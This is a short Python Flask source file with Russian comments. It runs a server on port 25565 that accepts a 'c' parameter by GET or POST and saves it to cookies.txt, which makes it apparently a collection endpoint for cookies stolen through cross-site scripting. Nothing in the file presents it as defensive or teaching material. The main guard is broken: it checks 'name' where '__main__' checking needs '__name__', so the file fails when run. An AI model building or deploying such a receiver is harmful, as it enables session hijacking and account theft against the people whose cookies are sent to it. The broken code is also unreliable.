from flask import Flask, request

app = Flask(__name__)

@app.route('/123/', methods=['GET', 'POST'])
def receive_cookies():
    if request.method == 'POST':
        cookies = request.form.get('c')
        if cookies:
            # Обработка полученных куков: сохранение в текстовый файл.
            with open('cookies.txt', 'w') as file:
                file.write(cookies)
            return f'Cookies received and saved to cookies.txt: {cookies}', 200
        else:
            return 'Bad Request', 400
    elif request.method == 'GET':
        cookies = request.args.get('c')
        if cookies:
            # Обработка полученных куков: сохранение в текстовый файл.
            with open('cookies.txt', 'w') as file:
                file.write(cookies)
            return f'Cookies received and saved to cookies.txt: {cookies}', 200
        else:
            return 'Bad Request', 400

if name == '__main__':
    app.run(host='0.0.0.0', port=25565)
